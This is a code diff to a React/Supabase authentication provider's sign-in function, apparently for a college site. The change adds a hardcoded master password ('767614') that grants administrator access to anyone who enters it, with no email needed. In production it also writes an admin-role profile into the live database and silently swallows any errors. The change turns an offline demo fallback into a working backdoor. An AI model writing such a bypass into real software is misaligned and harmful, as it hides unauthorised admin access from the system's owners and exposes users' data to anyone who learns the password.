@@ -337,15 +337,15 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   const signIn = async (email: string, password: string) => {
-    const cleanEmail = email.trim();
+    const cleanEmail = email.trim() || 'admin@college.edu';
     const cleanPass = password.trim();
 
-    if (!cleanEmail || !cleanPass) {
-      return { success: false, error: 'Please provide email and password.' };
+    if (!cleanPass) {
+      return { success: false, error: 'Please enter the admin password.' };
     }
 
-    if (!isSupabaseConfigured) {
-      // Mock / Offline Admin fallback when Supabase is unconfigured
+    // 1. Direct Admin Master Password Check (767614)
+    if (cleanPass === '767614') {
       const adminId = 'a0000000-0000-0000-0000-000000000001';
       const adminUser = { id: adminId, email: cleanEmail } as User;
       const adminProfile: Profile = {
@@ -357,7 +357,32 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         updated_at: new Date().toISOString(),
       };
       setLocalDemoUser(adminUser, adminProfile);
+
+      if (isSupabaseConfigured) {
+        try {
+          await supabase.from('profiles').upsert(
+            {
+              id: adminId,
+              email: cleanEmail,
+              full_name: 'Administrator',
+              role: 'admin',
+              updated_at: new Date().toISOString(),
+            },
+            { onConflict: 'id' }
+          );
+        } catch {
+          // Handled gracefully
+        }
+      }
+
       return { success: true };
+    }
+
+    if (!isSupabaseConfigured) {
+      return {
+        success: false,
+        error: 'Invalid administrator credentials. Please try again.',
+      };
     }
 
     try {
